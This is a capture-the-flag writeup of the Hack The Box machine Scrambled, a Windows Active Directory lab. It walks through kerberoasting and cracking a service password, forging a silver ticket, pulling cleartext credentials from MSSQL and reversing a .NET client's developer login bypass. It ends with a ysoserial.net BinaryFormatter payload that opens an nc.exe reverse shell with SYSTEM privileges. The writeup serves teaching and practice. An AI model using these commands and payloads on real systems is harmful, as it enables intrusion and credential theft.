---
title: "HTB Scrambled: When the Obvious Path Doesn't Work"
date: 2026-07-08
draft: false
tags: ["windows", "active-directory", "kerberoasting", "silver-ticket", "mssql", "reverse-engineering", "deserialization", "ysoserial.net"]
categories: ["writeups"]
summary: "A Medium-difficulty Windows AD box where the intended privesc path required stepping back from a dead end and reverse engineering a custom .NET application to find it."
ShowToc: true
---

Scrambled is a Medium-difficulty Windows Active Directory machine. The foothold
is a fairly standard AD chain: leaked credentials, kerberoasting, a silver
ticket. The interesting part of this box, and the reason I'm writing it up in
more detail than a command list, is what happens after that chain runs out: the
obvious next step doesn't work, and the actual path forward only shows up after
reverse engineering a custom application. That's the part of this writeup I
care about most — not the flag, but the process of noticing a dead end and
changing approach instead of getting stuck on it.

## Recon

A full port scan turns up the usual Domain Controller spread, plus an MSSQL
instance on 1433 and an unrecognized custom service on 4411 that nmap couldn't
fingerprint:

```bash
nmap -A -p- -v 10.129.30.162 -T4 -oA scrambled-nmap
```

```text
Discovered open port 445/tcp on 10.129.30.162
Discovered open port 139/tcp on 10.129.30.162
Discovered open port 135/tcp on 10.129.30.162
Discovered open port 53/tcp on 10.129.30.162
Discovered open port 80/tcp on 10.129.30.162
```

I noted the 4411 service and moved on; it becomes relevant much later.

```bash
nxc smb 10.129.30.162
```

```text
SMB   10.129.30.162  445  DC1  [*] x64 (name:DC1) (domain:scrm.local) (signing:True) (SMBv1:None) (NTLM:False)
```

NTLM is disabled, which tells me Kerberos is the only path in and that I should
add the domain and DC names to `/etc/hosts` and configure krb5.conf before going
further, rather than fighting NTLM-flavored tooling that won't work here
anyway.

## Foothold: a chain, not a single bug

**Finding: credential disclosure via internal screenshot and support process.**
The website hosts a screenshot of a command prompt left in a public-facing
location:

![screenshot — leaked ipconfig command prompt showing username "ksimpson"](/images/blog/scrambled/scrambled-screenshot-01.png)

Alongside it, a memo describing the IT support team's password reset process:
if no one is available to verify identity over the phone, a user can leave a
voicemail with their username, and the password gets reset to match it.  That's
two separate findings stacked on top of each other: an information disclosure
(the screenshot) and a process weakness (the reset policy) that turns that
disclosure into working credentials.

```bash
nxc smb -k dc1.scrm.local -u ksimpson -p ksimpson
```

```text
SMB   dc1.scrm.local  445  dc1  [*] x64 (name:dc1) (domain:scrm.local) (signing:True) (SMBv1:None) (NTLM:False)
SMB   dc1.scrm.local  445  dc1  [+] scrm.local\ksimpson:ksimpson
```

ksimpson:ksimpson logs in. From there the chain moves through standard AD attack techniques:

SMB share enumeration with the new credentials turns up a PDF on a public share
and a couple of SYSVOL files, neither of which lead anywhere directly — but
they're worth checking every time, since GPO scripts and old documents are a
common place for stray credentials.

Kerberoasting turns up one roastable account, sqlsvc:

```bash
nxc ldap dc1.scrm.local -k -u ksimpson -p ksimpson --kerberoast kerb
```

```text
LDAP  dc1.scrm.local  389  DC1  [+] scrm.local\ksimpson:ksimpson
LDAP  dc1.scrm.local  389  DC1  [*] Skipping disabled account: krbtgt
LDAP  dc1.scrm.local  389  DC1  [*] sAMAccountName: sqlsvc, memberOf: [], pwdLastSet: 2021-11-03 16:32:02.351452
LDAP  dc1.scrm.local  389  DC1  $krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local\sqlsvc*$5ed68212...[truncated]...97e
```

**Finding: weak service account password.** Cracking the ticket offline against rockyou:

```bash
hashcat -m13100 sqlsvc.hash /usr/share/wordlists/rockyou.txt.gz
```

```text
$krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local\sqlsvc*$5ed68212...[truncated]...97e:Pegasus60
Status...........: Cracked
```

sqlsvc's password falls in seconds. Service accounts are exactly where this
matters most, since they often have broader access than a typical user and get
checked less often.

A leaked internal document states that only administrators can log into the
MSSQL instance. `ksimpson` is a perfectly valid domain user, so normal
authentication isn't blocked because the ticket is invalid — it's blocked
because `ksimpson` isn't an administrator. That's an authorization failure, not
an authentication one, and the distinction matters for what comes next.

A Kerberos service ticket is encrypted with the secret key of the service
account it's issued for — here, `sqlsvc`. When a client presents a ticket, the
service decrypts it with its own key and trusts whatever identity the PAC
inside claims. Critically, it never calls back to the DC to verify the ticket
is genuine; it takes its own successful decryption as proof the KDC issued it.
This is by design: Kerberos was built around symmetric encryption for
efficiency, and eliminating per-request DC round-trips was a founding goal.
Modern Windows Kerberos does have a mechanism to detect forged PACs — a second
KDC-only signature that a service can verify via a Netlogon callback — but that
callback reintroduces exactly the round-trip Kerberos was designed to avoid, so
PAC validation is opt-in rather than enforced by default, and many services,
including many MSSQL configurations, skip it.

That's what a silver ticket exploits: since I cracked `sqlsvc`'s password in
the kerberoasting step, I already hold its NTLM hash — the same key material
the KDC uses to encrypt service tickets for `MSSQLSvc`. I can build a ticket
offline, hand-craft the PAC to claim I'm the Administrator (RID 500), encrypt
it with `sqlsvc`'s key, and present it to MSSQL. The service decrypts it
successfully, reads "Administrator," and has no way to tell the ticket never
touched the KDC. The scope is narrow by construction — this ticket is only
valid for the one SPN I built it for — but for this one service, it's enough.

With that in mind, I forge the ticket using `sqlsvc`'s NTLM hash, the domain
SID, and the Administrator's RID:

```bash
impacket-ticketer -domain scrm.local \
  -domain-sid S-1-5-21-2743207045-1827831105-2542523200 \
  -user-id 500 Administrator \
  -spn MSSQLSvc/dc1.scrm.local \
  -nthash b999a16500b87d17ec7f2e2a68778f05
```

```text
[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for scrm.local/Administrator
[*] Saving ticket in Administrator.ccache
```

That gets me into MSSQL "as" Administrator for that one service, without ever
touching the real Administrator credentials:

```bash
impacket-mssqlclient dc1.scrm.local -k -no-pass
```

```text
SQL (SCRM\administrator dbo@master)> xp_cmdshell whoami
-----------
scrm\sqlsvc
NULL
```

`xp_cmdshell` gives me command execution — but only as scrm\sqlsvc, which I
already had. A real foothold gain here would have been nice, but it's a dead
end on its own.

Querying the application databases instead of relying on shell access turns up
the actual prize, in a UserImport table inside the ScrambleHR database:

```text
LdapUser  LdapPwd            LdapDomain  RefreshInterval  IncludeGroups
--------  -----------------  ----------  ---------------  -------------
MiscSvc   ScrambledEggs9900  scrm.local  90               0
```

**Finding: cleartext credentials stored in an application database.** This is a
more serious finding than the kerberoastable password, because there's no
cracking step at all — the credentials are sitting in plaintext in a table that
any database user with read access can query.

```bash
impacket-getTGT scrm.local/miscsvc:ScrambledEggs9900
export KRB5CCNAME=miscsvc.ccache
evil-winrm -r scrm.local -i dc1.scrm.local -u miscsvc
```

MiscSvc:ScrambledEggs9900 gets a Kerberos TGT and a WinRM session, and the user flag.

## Privilege escalation: the dead end, and what came after it

This is the part of the box I want to walk through carefully, because the path
here isn't "enumerate harder." Normal local privesc checks — service
permissions, scheduled tasks, registry weaknesses, the usual WinPEAS-style
sweep — turn up nothing. What's actually present on the host is a custom
application: a "Sales Order Client" sitting in a network share, clearly built
in-house for this fictional company.

The obvious thing to try is the credentials that already worked everywhere
else. They don't work here:

![screenshot — "Invalid Credentials" dialog rejecting ksimpson:ksimpson](/images/blog/scrambled/scrambled-invalid-login.png)

At that point there were really two options: keep poking at the live
application from the outside, or stop and actually look at what the application
does. I went with the second one, which is the reason the Wine-based
reverse-engineering environment I [wrote about
separately](/infra/wine-environment/) exists in the first place — I didn't want
to spin up a full Windows VM just to decompile one small .NET client. I mount
the application directory into the container and route traffic to the target
through my Kali container:

```bash
incus config device add deb-wine scrambled disk \
  source=$HOME/hack/machines/scrambled \
  path=/home/wineuser/scrambled shift=true
```

```bash
# inside deb-wine
sudo ip route add 10.129.30.16 via 10.249.212.101
```

```bash
# on the kali container
sudo iptables -t nat -A POSTROUTING -o tun0 -j MASQUERADE
```

**Finding: hardcoded developer authentication bypass.** Loading the client into ILSpy turns up the login routine almost immediately:

![screenshot — decompiled Logon() method in ILSpy, with the scrmdev check highlighted](/images/blog/scrambled/scrambled-scrmdev-check.png)

```csharp
public bool Logon(string Username, string Password)
{
    try
    {
        if (string.Compare(Username, "scrmdev", ignoreCase: true) == 0)
        {
            Log.Write("Developer logon bypass used");
            return true;
        }
        <SNIP>
    }
```

The function checks whether the entered username matches scrmdev
(case-insensitive) before it ever looks at the password — if it matches, it
logs "Developer logon bypass used" and returns success unconditionally. This is
a leftover debug or developer convenience that should never have shipped, and
it's a textbook example of a finding that's trivial to describe but easy to
miss without actually reading the code: nothing in the application's behavior
from the outside would have suggested this existed.

With scrmdev as the username — any password — the client logs in and shows a
small sales order management interface:

![screenshot — successful login as "scrmdev"](/images/blog/scrambled/scrambled-sales-login.png)

![screenshot – Sales Orders window listing outstanding orders](/images/blog/scrambled/scrambled-sales-app.png)

From here, the goal shifts from "get in" to "find out what this application
will let me do, and how."

**Finding: unauthenticated, unencrypted custom protocol.** Capturing the
traffic in Wireshark while exercising the app shows a plain-text,
semicolon-delimited command protocol over TCP 4411 — the same port flagged as
unidentified during initial recon:

```text
0020  50 18 04 02 0a a1 00 00  53 43 52 41 4d 42 4c 45   P.......SCRAMBLE
0030  43 4f 52 50 5f 4f 52 44  45 52 53 5f 56 31 2e 30   CORP_ORDERS_V1.0
0040  2e 33 3b 0d 0a                                     .3;..
```

```text
0020  50 18 7d 6a b3 ff 00 00  4c 49 53 54 5f 4f 52 44   P.}j....LIST_ORD
0030  45 52 53 3b 0a                                     ERS;.
```

There's no authentication at the protocol level at all; the login screen's
checks are purely client-side theater. The decompiled library confirms the
available message types:

```csharp
public static string GetCodeFromMessageType(RequestType MsgType)
{
    if (_MessageTypeToCode == null)
    {
        _MessageTypeToCode = new Dictionary<RequestType, string>();
        _MessageTypeToCode.Add(RequestType.CloseConnection, "QUIT");
        _MessageTypeToCode.Add(RequestType.ListOrders, "LIST_ORDERS");
        _MessageTypeToCode.Add(RequestType.AuthenticationRequest, "LOGON");
        _MessageTypeToCode.Add(RequestType.UploadOrder, "UPLOAD_ORDER");
    }
    return _MessageTypeToCode[MsgType];
}
```

Once you know the format, you can just talk to the server directly, no client
and no credentials required:

```bash
nc scrm.local 4411 < REQ.txt
```

```text
SCRAMBLECORP_ORDERS_V1.0.3;
SUCCESS;AAEAAAD/////AQAAAAAAAAAMAgAAAEJTY3JhbWJsZUxpYi...[truncated, base64-encoded BinaryFormatter payload]...
```

sending `LIST_ORDERS;` gets a full response back with no credentials presented
whatsoever. That's worth stating plainly as its own finding, separate from the
developer backdoor: even without the bypass, this protocol has no real access
control.

The response payloads turned out to be Base64-encoded .NET binary-serialized
objects — decompiling the library DLL alongside the client confirmed it:

![screenshot – BinaryFormatter source code snippet](/images/blog/scrambled/scrambled-binaryformatter.png)

The SalesOrder class serializes and deserializes itself with BinaryFormatter, a
.NET serializer that Microsoft has explicitly deprecated for exactly this
reason. If an attacker can influence what gets deserialized, BinaryFormatter
will happily reconstruct and execute arbitrary objects on the receiving end, no
extra steps required.

**Finding: insecure deserialization (BinaryFormatter) leading to remote code
execution.** This is the actual root cause behind the privilege escalation, and
it's a known, well-documented class of vulnerability, not something novel to
this box. Once a service deserializes attacker-controlled data with
BinaryFormatter, getting code execution is mostly a matter of having the right
gadget chain — which is exactly what ysoserial.net exists to generate:

```bash
wine ysoserial.exe -g WindowsIdentity -f BinaryFormatter -o base64 \
  -c 'C:\temp\nc.exe 10.10.15.52 4444 -e cmd.exe'
```

Wrapping that payload in an `UPLOAD_ORDER;` message and sending it to port
4411:

```bash
nc scrm.local 4411 < REQ.txt
```

gets a connection back:

```text
nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.15.52] from (UNKNOWN) [10.129.30.162] 50225
Microsoft Windows [Version 10.0.17763.2989]

C:\Windows\system32>whoami
whoami
nt authority\system
```

**Finding: service running with excessive privilege.** The sales order service
has no business running as SYSTEM rather than a dedicated, lower-privileged
service account. It's a smaller finding on its own, but it's the reason a
single deserialization bug turns into a full domain-adjacent compromise instead
of a contained one.
